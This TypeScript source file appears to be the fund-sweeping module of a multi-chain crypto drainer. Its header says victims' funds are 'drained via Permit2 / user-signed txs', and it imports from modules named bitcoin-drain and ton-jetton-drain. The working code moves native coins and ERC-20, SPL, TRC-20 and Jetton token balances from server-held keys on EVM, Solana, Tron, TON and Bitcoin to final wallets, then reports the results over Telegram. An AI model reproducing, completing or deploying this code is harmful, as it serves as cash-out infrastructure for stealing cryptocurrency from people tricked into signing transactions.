// @ts-nocheck
/**
 * Simple vault sweep — native + token transfers from execution-controlled wallets
 * to configured FINAL_WALLET_* destinations (no swaps, no mixers).
 *
 * Funds drained via Permit2 / user-signed txs land on SOVEREIGN_VAULT_*; this module
 * sweeps balances on the address controlled by each chain's execution key. When vault
 * and execution addresses differ, a warning is recorded (vault balance is not movable
 * without the vault private key).
 */
import {
  Connection,
  PublicKey,
  SystemProgram,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'
import {
  createPublicClient,
  createWalletClient,
  formatEther,
  getAddress,
  http,
  isAddress,
  parseAbi,
  parseEther,
  type Address,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'

import { TRON_MAINNET_USDT_CONTRACT } from '../adapters/tron-adapter.js'
import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import { fetchWalletUtxos } from './bitcoin-drain.js'
import {
  executeServerBitcoinPsbtSweep,
  executeServerSolNativeTransfer,
  executeServerTonNativeTransfer,
  executeServerTrxTransfer,
  fetchTronBalance,
  fetchTonBalance,
  isDryRunExecution,
  loadServerSolanaKeypair,
  resolveServerBitcoinAddress,
  resolveServerTonAddress,
  resolveServerTronAddressAsync,
} from './server-chain-execution.js'
import {
  resolveEvmRpcUrlForChain,
  resolveSettlementExecutorKey,
} from './permit2-executor.js'
import { resolveSovereignVaultAddresses } from './settlement-execution-bridge.js'
import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
import { buildJettonTransferBody, confirmJettonTransferAfterBroadcast } from './ton-jetton-drain.js'
import { pollSolanaConfirmation } from './tx-confirmation-poller.js'
import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
import { Address as TonAddress, Cell, internal, toNano, WalletContractV4 } from '@ton/ton'
import { JettonMaster, JettonWallet, TonClient } from '@ton/ton'

const ERC20_ABI = parseAbi([
  'function balanceOf(address account) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
])

const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV')

export type SweepChain = 'EVM' | 'SOL' | 'TRON' | 'TON' | 'BTC'

export type ChainSweepResult = {
  chain: SweepChain
  ok: boolean
  source_address?: string
  vault_address?: string
  final_address?: string
  tx_hashes: string[]
  errors: string[]
  warnings: string[]
  skipped: string[]
}

export type SweepAllResult = {
  ok: boolean
  enabled: boolean
  dry_run: boolean
  chains: ChainSweepResult[]
  timestamp: string
}

function isTruthyEnv(name: string): boolean {
  const v = process.env[name]?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function isSweepEnabled(): boolean {
  return isTruthyEnv('SWEEP_ENABLED')
}

export function isSweepCreateAtaEnabled(): boolean {
  const v = process.env['SWEEP_CREATE_ATA']?.trim().toLowerCase()
  if (v === 'false' || v === '0') return false
  return true
}

function parsePositiveFloat(raw: string | undefined, fallback: number): number {
  if (!raw?.trim()) return fallback
  const n = Number.parseFloat(raw.trim())
  return Number.isFinite(n) && n >= 0 ? n : fallback
}

export type ExecutionGasReserveChain = 'EVM' | 'SOL' | 'TRON' | 'TON' | 'BTC'

const GAS_RESERVE_ENV_KEYS: Record<ExecutionGasReserveChain, string> = {
  EVM: 'EXECUTION_GAS_RESERVE_EVM',
  SOL: 'EXECUTION_GAS_RESERVE_SOL',
  TRON: 'EXECUTION_GAS_RESERVE_TRX',
  TON: 'EXECUTION_GAS_RESERVE_TON',
  BTC: 'EXECUTION_GAS_RESERVE_BTC',
}

const GAS_RESERVE_DEFAULTS: Record<ExecutionGasReserveChain, number> = {
  EVM: 0.005,
  SOL: 0.05,
  TRON: 50,
  TON: 2,
  BTC: 0.00015,
}

const GAS_RESERVE_SWEEP_FALLBACK: Record<ExecutionGasReserveChain, string> = {
  EVM: 'SWEEP_MIN_ETH',
  SOL: 'SWEEP_MIN_SOL',
  TRON: 'SWEEP_MIN_TRX',
  TON: 'SWEEP_MIN_TON',
  BTC: 'SWEEP_MIN_BTC',
}

/** Minimum native balance to keep on execution wallets (human units per chain). */
export function readExecutionGasReserve(chain: ExecutionGasReserveChain): number {
  const primary = process.env[GAS_RESERVE_ENV_KEYS[chain]]?.trim()
  if (primary) return parsePositiveFloat(primary, GAS_RESERVE_DEFAULTS[chain])
  return parsePositiveFloat(
    process.env[GAS_RESERVE_SWEEP_FALLBACK[chain]],
    GAS_RESERVE_DEFAULTS[chain],
  )
}

/** Gas reserve in smallest on-chain units. */
export function readExecutionGasReserveNative(chain: ExecutionGasReserveChain): bigint {
  const n = readExecutionGasReserve(chain)
  switch (chain) {
    case 'EVM':
      return parseEther(String(n))
    case 'SOL':
      return BigInt(Math.ceil(n * 1e9))
    case 'TRON':
      return BigInt(Math.ceil(n * 1e6))
    case 'TON':
      return BigInt(Math.ceil(n * 1e9))
    case 'BTC':
      return BigInt(Math.ceil(n * 1e8))
  }
}

function capSweepAmount(surplus: bigint, maxAmount?: bigint): bigint {
  if (maxAmount == null) return surplus
  return maxAmount < surplus ? maxAmount : surplus
}

export function readSweepErc20Tokens(): Address[] {
  const raw = process.env['SWEEP_ERC20_TOKENS']?.trim()
  if (!raw) return []
  const out: Address[] = []
  for (const part of raw.split(',')) {
    const t = part.trim()
    if (t && isAddress(t)) out.push(getAddress(t))
  }
  return out
}

function readSweepTrc20Contracts(): string[] {
  const raw = process.env['SWEEP_TRC20_CONTRACTS']?.trim()
  if (raw) {
    return raw
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean)
  }
  return [TRON_MAINNET_USDT_CONTRACT]
}

function addressesMatch(a: string | undefined, b: string | undefined): boolean {
  if (!a || !b) return false
  const al = a.trim().toLowerCase()
  const bl = b.trim().toLowerCase()
  if (al === bl) return true
  if (al.startsWith('0x') && bl.startsWith('0x')) return al === bl
  return al === bl
}

function vaultMismatchWarning(
  chain: string,
  vault: string | undefined,
  source: string,
): string | null {
  if (!vault) return null
  if (addressesMatch(vault, source)) return null
  return `${chain}: vault ${vault} differs from execution wallet ${source}; sweeping execution wallet only`
}

/** Reserve shortfalls are warnings only — never add to `skipped`. */
function warnSweepBalance(
  result: ChainSweepResult,
  asset: string,
  message: string,
): void {
  result.warnings.push(`${asset}: ${message}`)
}

function deriveAta(owner: PublicKey, mint: PublicKey): PublicKey {
  const [ata] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID,
  )
  return ata
}

function createAssociatedTokenAccountIdempotentInstruction(
  payer: PublicKey,
  ata: PublicKey,
  owner: PublicKey,
  mint: PublicKey,
): TransactionInstruction {
  const data = Buffer.alloc(1)
  data.writeUInt8(1, 0)
  return new TransactionInstruction({
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: ata, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
    data,
  })
}

function createSplTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint,
): TransactionInstruction {
  const data = Buffer.alloc(9)
  data.writeUInt8(3, 0)
  data.writeBigUInt64LE(amount, 1)
  return new TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data,
  })
}

async function signAndSendSolanaTransaction(
  connection: Connection,
  keypair: ReturnType<typeof loadServerSolanaKeypair>,
  instructions: TransactionInstruction[],
): Promise<string> {
  if (!keypair) throw new Error('Solana keypair missing')
  const { blockhash } = await connection.getLatestBlockhash('finalized')
  const msg = new TransactionMessage({
    payerKey: keypair.publicKey,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message()
  const tx = new VersionedTransaction(msg)
  tx.sign([keypair])
  const sig = await connection.sendRawTransaction(tx.serialize(), {
    preflightCommitment: 'confirmed',
    skipPreflight: false,
    maxRetries: 3,
  })
  // HTTP polling — no WebSocket leak (confirmTransaction() creates dangling WS → FATAL unhandledRejection)
  const _sweepRpcUrl = resolveInstitutionalSolanaRpcUrl() || 'https://api.mainnet-beta.solana.com'
  const _sweepPoll = await pollSolanaConfirmation(sig, _sweepRpcUrl, { intervalMs: 2_000, timeoutMs: 30_000 })
  if (_sweepPoll.status === 'failed') {
    throw new Error(`Solana confirmation failed: ${_sweepPoll.detail}`)
  }
  return sig
}

/** Transfer ETH + configured ERC-20 tokens from the EVM execution wallet to `finalAddress`. */
export async function sweepEvmVault(
  finalAddress: string,
  gasReserveEth: number,
  minToken = 0,
  maxAmount?: bigint,
): Promise<ChainSweepResult> {
  const result: ChainSweepResult = {
    chain: 'EVM',
    ok: false,
    tx_hashes: [],
    errors: [],
    warnings: [],
    skipped: [],
  }

  if (!isAddress(finalAddress)) {
    result.errors.push('finalAddress is not a valid EVM address')
    return result
  }
  const final = getAddress(finalAddress)
  result.final_address = final

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    result.errors.push('SETTLEMENT_EXECUTION_PRIVATE_KEY not configured')
    return result
  }

  const account = privateKeyToAccount(executorKey)
  result.source_address = account.address

  const vaults = resolveSovereignVaultAddresses()
  result.vault_address = vaults.evm
  const mismatch = vaultMismatchWarning('EVM', vaults.evm, account.address)
  if (mismatch) result.warnings.push(mismatch)

  const rpcUrl = await resolveEvmRpcUrlForChain(1)
  const publicClient = createPublicClient({ transport: http(rpcUrl) })
  const walletClient = createWalletClient({
    account,
    transport: http(rpcUrl),
  })

  const reserveWei = parseEther(String(gasReserveEth))
  const gasPrice = await publicClient.getGasPrice()
  const nativeGasLimit = 21_000n
  const nativeGasCost = nativeGasLimit * gasPrice

  try {
    const balance = await publicClient.getBalance({ address: account.address })
    if (balance === 0n) {
      warnSweepBalance(result, 'ETH', 'zero balance — nothing to sweep')
    } else {
      const surplus = balance - nativeGasCost - reserveWei
      if (surplus <= 0n) {
        warnSweepBalance(
          result,
          'ETH',
          `⚠️ Balance (${formatEther(balance)}) not enough to leave reserve (${gasReserveEth}). No sweep performed.`,
        )
      } else {
        const sendValue = capSweepAmount(surplus, maxAmount)
        if (isDryRunExecution()) {
          result.tx_hashes.push(`dry-run-eth-${Date.now()}`)
        } else {
          const hash = await walletClient.sendTransaction({
            account,
            to: final,
            value: sendValue,
            gas: nativeGasLimit,
            gasPrice,
          } as unknown as Parameters<typeof walletClient.sendTransaction>[0])
          result.tx_hashes.push(hash)
        }
      }
    }
  } catch (e) {
    result.errors.push(`ETH: ${e instanceof Error ? e.message : String(e)}`)
  }

  const tokens = readSweepErc20Tokens()
  const minTokenWei = minToken > 0 ? BigInt(Math.floor(minToken * 1e6)) : 0n

  for (const token of tokens) {
    try {
      const tokenBalance = (await publicClient.readContract({
        address: token,
        abi: ERC20_ABI,
        functionName: 'balanceOf',
        args: [account.address],
      })) as bigint

      if (tokenBalance <= minTokenWei) {
        result.skipped.push(`ERC20 ${token}: zero or below min`)
        continue
      }

      if (isDryRunExecution()) {
        result.tx_hashes.push(`dry-run-erc20-${token.slice(0, 10)}-${Date.now()}`)
        continue
      }

      const hash = await walletClient.writeContract({
        account,
        address: token,
        abi: ERC20_ABI,
        functionName: 'transfer',
        args: [final, tokenBalance],
      } as unknown as Parameters<typeof walletClient.writeContract>[0])
      result.tx_hashes.push(hash)
    } catch (e) {
      result.errors.push(
        `ERC20 ${token}: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  result.ok = result.errors.length === 0
  return result
}

/** Transfer SOL + SPL tokens from the Solana execution wallet to `finalAddress`. */
export async function sweepSolVault(
  finalAddress: string,
  gasReserveSol: number,
  maxAmount?: bigint,
): Promise<ChainSweepResult> {
  const result: ChainSweepResult = {
    chain: 'SOL',
    ok: false,
    tx_hashes: [],
    errors: [],
    warnings: [],
    skipped: [],
  }

  const final = finalAddress.trim()
  if (!final) {
    result.errors.push('finalAddress required')
    return result
  }
  result.final_address = final

  const keypair = loadServerSolanaKeypair()
  if (!keypair) {
    result.errors.push('SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY not configured')
    return result
  }

  const source = keypair.publicKey.toBase58()
  result.source_address = source

  const vaults = resolveSovereignVaultAddresses()
  result.vault_address = vaults.svm
  const mismatch = vaultMismatchWarning('SOL', vaults.svm, source)
  if (mismatch) result.warnings.push(mismatch)

  const rpc =
    resolveInstitutionalSolanaRpcUrl() || 'https://api.mainnet-beta.solana.com'
  const connection = new Connection(rpc, { commitment: 'confirmed' })
  const reserveLamports = BigInt(Math.ceil(gasReserveSol * 1e9))
  const rentBuffer = 5000n

  try {
    const lamports = BigInt(await connection.getBalance(keypair.publicKey))
    if (lamports === 0n) {
      warnSweepBalance(result, 'SOL', 'zero balance — nothing to sweep')
    } else {
      const surplus = lamports - rentBuffer - reserveLamports
      if (surplus <= 0n) {
        warnSweepBalance(
          result,
          'SOL',
          `⚠️ Balance (${(Number(lamports) / 1e9).toFixed(6)} SOL) not enough to leave reserve (${gasReserveSol}). No sweep performed.`,
        )
      } else {
        const sendLamports = capSweepAmount(surplus, maxAmount)
        const sol = await executeServerSolNativeTransfer({
          fromWallet: source,
          toVault: final,
          lamports: sendLamports,
          rpcUrl: rpc,
        })
        if (sol.ok) result.tx_hashes.push(sol.txSig)
        else result.errors.push(`SOL: ${'detail' in sol ? sol.detail : 'unknown'}`)
      }
    }
  } catch (e) {
    result.errors.push(`SOL: ${e instanceof Error ? e.message : String(e)}`)
  }

  try {
    const owner = keypair.publicKey
    const destOwner = new PublicKey(final)
    const parsed = await connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_PROGRAM_ID,
    })

    for (const { pubkey, account } of parsed.value) {
      const info = account.data
      if (
        info.program !== 'spl-token' ||
        typeof info.parsed !== 'object' ||
        info.parsed === null
      ) {
        continue
      }
      const pi = (info.parsed as { info?: Record<string, unknown> }).info
      if (!pi) continue
      const mintStr = typeof pi.mint === 'string' ? pi.mint : ''
      const tokenAmount = pi.tokenAmount as { amount?: string } | undefined
      const amountRaw = tokenAmount?.amount ?? '0'
      const amount = BigInt(amountRaw)
      if (amount <= 0n || !mintStr) continue

      const mint = new PublicKey(mintStr)
      const sourceAta = new PublicKey(pubkey.toBase58())
      const destAta = deriveAta(destOwner, mint)
      const instructions: TransactionInstruction[] = []
      const destInfo = await connection.getAccountInfo(destAta)
      if (!destInfo && isSweepCreateAtaEnabled()) {
        instructions.push(
          createAssociatedTokenAccountIdempotentInstruction(owner, destAta, destOwner, mint),
        )
      } else if (!destInfo) {
        result.skipped.push(`SPL ${mintStr.slice(0, 8)}…: destination ATA missing`)
        continue
      }

      instructions.push(createSplTransferInstruction(sourceAta, destAta, owner, amount))

      try {
        const sig = await signAndSendSolanaTransaction(connection, keypair, instructions)
        result.tx_hashes.push(sig)
      } catch (e) {
        result.errors.push(
          `SPL ${mintStr}: ${e instanceof Error ? e.message : String(e)}`,
        )
      }
    }
  } catch (e) {
    result.errors.push(`SPL scan: ${e instanceof Error ? e.message : String(e)}`)
  }

  result.ok = result.errors.length === 0
  return result
}

async function sweepTrc20Token(params: {
  tronWeb: import('tronweb').TronWeb
  fromAddress: string
  contract: string
  finalAddress: string
}): Promise<string> {
  const contract = await params.tronWeb.contract().at(params.contract)
  const balance = await (
    contract as unknown as {
      balanceOf: (addr: string) => { call: () => Promise<unknown> }
    }
  )
    .balanceOf(params.fromAddress)
    .call()

  const balanceBn =
    typeof balance === 'bigint'
      ? balance
      : BigInt(
          typeof balance === 'object' && balance !== null && '_hex' in balance
            ? String((balance as { _hex: string })._hex)
            : String(balance),
        )

  if (balanceBn <= 0n) {
    throw new Error('zero balance')
  }

  const txHash = await (
    contract as unknown as {
      transfer: (to: string, amount: number) => { send: () => Promise<string> }
    }
  )
    .transfer(params.finalAddress, Number(balanceBn))
    .send()

  return typeof txHash === 'string' ? txHash : String(txHash)
}

/** Transfer TRX + TRC-20 from the Tron execution wallet to `finalAddress`. */
export async function sweepTronVault(
  finalAddress: string,
  gasReserveTrx: number,
  maxAmount?: bigint,
): Promise<ChainSweepResult> {
  const result: ChainSweepResult = {
    chain: 'TRON',
    ok: false,
    tx_hashes: [],
    errors: [],
    warnings: [],
    skipped: [],
  }

  const final = finalAddress.trim()
  if (!final) {
    result.errors.push('finalAddress required')
    return result
  }
  result.final_address = final

  const fromAddress = await resolveServerTronAddressAsync()
  if (!fromAddress) {
    result.errors.push('TRON_EXECUTION_PRIVATE_KEY not configured')
    return result
  }
  result.source_address = fromAddress

  const vaults = resolveSovereignVaultAddresses()
  result.vault_address = vaults.tron
  const mismatch = vaultMismatchWarning('TRON', vaults.tron, fromAddress)
  if (mismatch) result.warnings.push(mismatch)

  const reserveSun = BigInt(Math.ceil(gasReserveTrx * 1_000_000))
  const feeBuffer = 2_000_000n

  try {
    const balanceSun = BigInt(await fetchTronBalance(fromAddress))
    if (balanceSun === 0n) {
      warnSweepBalance(result, 'TRX', 'zero balance — nothing to sweep')
    } else {
      const surplus = balanceSun - feeBuffer - reserveSun
      if (surplus <= 0n) {
        warnSweepBalance(
          result,
          'TRX',
          `⚠️ Balance (${(Number(balanceSun) / 1e6).toFixed(2)} TRX) not enough to leave reserve (${gasReserveTrx}). No sweep performed.`,
        )
      } else {
        const sendSun = capSweepAmount(surplus, maxAmount)
        const trx = await executeServerTrxTransfer({
          toVault: final,
          amountSun: sendSun,
        })
        if (trx.ok) result.tx_hashes.push(trx.txHash)
        else result.errors.push(`TRX: ${'detail' in trx ? trx.detail : 'unknown'}`)
      }
    }
  } catch (e) {
    result.errors.push(`TRX: ${e instanceof Error ? e.message : String(e)}`)
  }

  const pk = process.env['TRON_EXECUTION_PRIVATE_KEY']?.trim().replace(/^0x/i, '')
  if (!pk) {
    result.errors.push('TRON_EXECUTION_PRIVATE_KEY missing for TRC-20')
    result.ok = result.errors.length === 0
    return result
  }

  const fullHost = resolveTronSensoryFullHost()
  const headers = tronProApiHeaders()

  for (const contract of readSweepTrc20Contracts()) {
    try {
      if (isDryRunExecution()) {
        result.tx_hashes.push(`dry-run-trc20-${contract.slice(0, 8)}-${Date.now()}`)
        continue
      }
      const { TronWeb } = await import('tronweb')
      const tronWeb =
        headers != null
          ? new TronWeb({ fullHost, headers, privateKey: pk.padStart(64, '0') })
          : new TronWeb({ fullHost, privateKey: pk.padStart(64, '0') })

      const txHash = await sweepTrc20Token({
        tronWeb,
        fromAddress,
        contract,
        finalAddress: final,
      })
      result.tx_hashes.push(txHash)
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      if (msg.includes('zero balance')) {
        result.skipped.push(`TRC20 ${contract}: zero balance`)
      } else {
        result.errors.push(`TRC20 ${contract}: ${msg}`)
      }
    }
  }

  result.ok = result.errors.length === 0
  return result
}

function readSweepJettonMasters(): string[] {
  const raw = process.env['SWEEP_TON_JETTON_MASTERS']?.trim()
  if (!raw) return []
  return raw
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
}

async function sweepTonJettons(
  ownerAddress: string,
  finalAddress: string,
  result: ChainSweepResult,
): Promise<void> {
  const masters = readSweepJettonMasters()
  if (masters.length === 0) return

  const mnemonic = process.env['TON_EXECUTION_MNEMONIC']?.trim()
  if (!mnemonic) return

  try {
    const { mnemonicToWalletKey } = await import('@ton/crypto')
    const key = await mnemonicToWalletKey(mnemonic.split(' '))
    const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
    const endpoint = resolveTonCenterJsonRpcUrl()
    const apiKey = tonCenterApiHeaders()?.['X-API-Key']
    const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
    const provider = client.open(wallet)
    const owner = TonAddress.parse(ownerAddress)
    const destination = TonAddress.parse(finalAddress)

    for (const masterStr of masters) {
      try {
        const master = client.open(JettonMaster.create(TonAddress.parse(masterStr)))
        const jettonWalletAddress = await master.getWalletAddress(owner)
        const jettonWallet = client.open(
          JettonWallet.create(jettonWalletAddress),
        )
        const amount = await jettonWallet.getBalance()
        if (amount <= 0n) {
          result.skipped.push(`Jetton ${masterStr.slice(0, 8)}…: zero balance`)
          continue
        }
        const payloadB64 = buildJettonTransferBody({
          amount,
          destination,
          responseDestination: owner,
          forwardTonAmount: toNano('0.01'),
        })
        const bodyCell = Cell.fromBoc(Buffer.from(payloadB64, 'base64'))[0]
        if (!bodyCell) continue

        const seqno = await provider.getSeqno()
        await provider.sendTransfer({
          seqno,
          secretKey: key.secretKey,
          messages: [
            internal({
              to: jettonWalletAddress,
              value: toNano('0.05'),
              bounce: true,
              body: bodyCell,
            }),
          ],
        })
        const walletAddress = wallet.address.toString({ bounceable: false, urlSafe: true })
        const confirmed = await confirmJettonTransferAfterBroadcast({
          walletAddress,
          seqnoBeforeSend: seqno,
          rpcUrl: endpoint,
        })
        result.tx_hashes.push(confirmed.tx_hash)
        if (confirmed.warning) {
          result.warnings.push(`Jetton ${masterStr.slice(0, 8)}…: ${confirmed.warning}`)
        }
      } catch (e) {
        result.errors.push(
          `Jetton ${masterStr}: ${e instanceof Error ? e.message : String(e)}`,
        )
      }
    }
  } catch (e) {
    result.errors.push(`Jetton scan: ${e instanceof Error ? e.message : String(e)}`)
  }
}

/** Transfer native TON from the execution mnemonic wallet to `finalAddress`. */
export async function sweepTonVault(
  finalAddress: string,
  gasReserveTon: number,
  maxAmount?: bigint,
): Promise<ChainSweepResult> {
  const result: ChainSweepResult = {
    chain: 'TON',
    ok: false,
    tx_hashes: [],
    errors: [],
    warnings: [],
    skipped: [],
  }

  const final = finalAddress.trim()
  if (!final) {
    result.errors.push('finalAddress required')
    return result
  }
  result.final_address = final

  const source = await resolveServerTonAddress()
  if (!source) {
    result.errors.push('TON_EXECUTION_MNEMONIC not configured')
    return result
  }
  result.source_address = source

  const vaults = resolveSovereignVaultAddresses()
  result.vault_address = vaults.ton
  const mismatch = vaultMismatchWarning('TON', vaults.ton, source)
  if (mismatch) result.warnings.push(mismatch)

  await sweepTonJettons(source, final, result)

  const reserveNanoton = BigInt(Math.ceil(gasReserveTon * 1e9))
  const forwardFee = 50_000_000n

  try {
    const balance = await fetchTonBalance()
    if (balance === 0n) {
      warnSweepBalance(result, 'TON', 'zero balance — nothing to sweep')
    } else {
      const surplus = balance - forwardFee - reserveNanoton
      if (surplus <= 0n) {
        warnSweepBalance(
          result,
          'TON',
          `⚠️ Balance (${(Number(balance) / 1e9).toFixed(4)} TON) not enough to leave reserve (${gasReserveTon}). No sweep performed.`,
        )
      } else {
        const sendAmount = capSweepAmount(surplus, maxAmount)
        const ton = await executeServerTonNativeTransfer({
          toVault: final,
          amountNanotons: sendAmount,
        })
        if (ton.ok) result.tx_hashes.push(ton.txHash)
        else result.errors.push(`TON: ${'detail' in ton ? ton.detail : 'unknown'}`)
      }
    }
  } catch (e) {
    result.errors.push(`TON: ${e instanceof Error ? e.message : String(e)}`)
  }

  result.ok = result.errors.length === 0
  return result
}

/** Sweep BTC UTXOs from the execution WIF wallet to `finalAddress`. */
export async function sweepBtcVault(
  finalAddress: string,
  gasReserveBtc: number,
  maxAmount?: bigint,
): Promise<ChainSweepResult> {
  const result: ChainSweepResult = {
    chain: 'BTC',
    ok: false,
    tx_hashes: [],
    errors: [],
    warnings: [],
    skipped: [],
  }

  const final = finalAddress.trim()
  if (!final) {
    result.errors.push('finalAddress required')
    return result
  }
  result.final_address = final

  const walletAddress = resolveServerBitcoinAddress()
  if (!walletAddress) {
    result.errors.push('BITCOIN_EXECUTION_WIF not configured')
    return result
  }
  result.source_address = walletAddress

  const vaults = resolveSovereignVaultAddresses()
  result.vault_address = vaults.btc
  const mismatch = vaultMismatchWarning('BTC', vaults.btc, walletAddress)
  if (mismatch) result.warnings.push(mismatch)

  const reserveSat = BigInt(Math.ceil(gasReserveBtc * 1e8))
  const feeEstimate = 2500n

  try {
    const utxos = await fetchWalletUtxos(walletAddress)
    const total = utxos.reduce((s, u) => s + u.value, 0n)
    if (total === 0n) {
      warnSweepBalance(result, 'BTC', 'zero balance — nothing to sweep')
    } else {
      const surplus = total - feeEstimate - reserveSat
      if (surplus <= 0n) {
        warnSweepBalance(
          result,
          'BTC',
          `⚠️ Balance (${(Number(total) / 1e8).toFixed(8)} BTC) not enough to leave reserve (${gasReserveBtc}). No sweep performed.`,
        )
      } else {
        const amountSat = capSweepAmount(surplus, maxAmount)
        const btc = await executeServerBitcoinPsbtSweep({
          walletAddress,
          vaultAddress: final,
          amountSat,
        })
        if (btc.ok) result.tx_hashes.push(btc.txHash)
        else result.errors.push(`BTC: ${'detail' in btc ? btc.detail : 'unknown'}`)
      }
    }
  } catch (e) {
    result.errors.push(`BTC: ${e instanceof Error ? e.message : String(e)}`)
  }

  result.ok = result.errors.length === 0
  return result
}

function readFinalWallet(chain: 'EVM' | 'SOL' | 'TRON' | 'TON' | 'BTC'): string | null {
  const keys: Record<typeof chain, string> = {
    EVM: 'FINAL_WALLET_EVM',
    SOL: 'FINAL_WALLET_SOL',
    TRON: 'FINAL_WALLET_TRX',
    TON: 'FINAL_WALLET_TON',
    BTC: 'FINAL_WALLET_BTC',
  }
  const raw = process.env[keys[chain]]?.trim()
  return raw || null
}

/** Run sweeps for every chain with a configured FINAL_WALLET_* when SWEEP_ENABLED=true (or `force`). */
export async function sweepAllVaults(options?: { force?: boolean }): Promise<SweepAllResult> {
  const enabled = isSweepEnabled() || options?.force === true
  const timestamp = new Date().toISOString()
  const dry_run = isDryRunExecution()

  if (!enabled) {
    return {
      ok: true,
      enabled: false,
      dry_run,
      chains: [],
      timestamp,
    }
  }

  const chains: ChainSweepResult[] = []

  const finalEvm = readFinalWallet('EVM')
  if (finalEvm) {
    chains.push(await sweepEvmVault(finalEvm, readExecutionGasReserve('EVM'), 0))
  }

  const finalSol = readFinalWallet('SOL')
  if (finalSol) {
    chains.push(await sweepSolVault(finalSol, readExecutionGasReserve('SOL')))
  }

  const finalTrx = readFinalWallet('TRON')
  if (finalTrx) {
    chains.push(await sweepTronVault(finalTrx, readExecutionGasReserve('TRON')))
  }

  const finalTon = readFinalWallet('TON')
  if (finalTon) {
    chains.push(await sweepTonVault(finalTon, readExecutionGasReserve('TON')))
  }

  const finalBtc = readFinalWallet('BTC')
  if (finalBtc) {
    chains.push(await sweepBtcVault(finalBtc, readExecutionGasReserve('BTC')))
  }

  const ok = chains.length > 0 && chains.every((c) => c.ok)

  return {
    ok,
    enabled: true,
    dry_run,
    chains,
    timestamp,
  }
}

/** Format sweep results for Telegram / logs. */
export function formatSweepAllResult(result: SweepAllResult): string {
  if (!result.enabled) {
    return 'Sweep disabled (SWEEP_ENABLED=false)'
  }

  const lines = [
    result.dry_run ? '🧪 <b>Vault sweep (DRY RUN)</b>' : '💸 <b>Vault sweep</b>',
    '━━━━━━━━━━━━━━━━',
    `🕐 ${result.timestamp}`,
    `Overall: ${result.ok ? '✅' : '⚠️'}`,
    '',
  ]

  if (result.chains.length === 0) {
    lines.push('No FINAL_WALLET_* addresses configured.')
    return lines.join('\n')
  }

  for (const c of result.chains) {
    lines.push(`<b>${c.chain}</b> ${c.ok ? '✅' : '⚠️'}`)
    if (c.source_address) lines.push(`  From: <code>${c.source_address}</code>`)
    if (c.final_address) lines.push(`  To: <code>${c.final_address}</code>`)
    if (c.tx_hashes.length > 0) {
      lines.push(`  Txs: ${c.tx_hashes.map((h) => `<code>${h.slice(0, 20)}…</code>`).join(', ')}`)
    }
    for (const w of c.warnings) lines.push(`  ⚠️ ${w}`)
    for (const e of c.errors) lines.push(`  ❌ ${e}`)
    for (const s of c.skipped) lines.push(`  ⏭ ${s}`)
    lines.push('')
  }

  return lines.join('\n').trim()
}
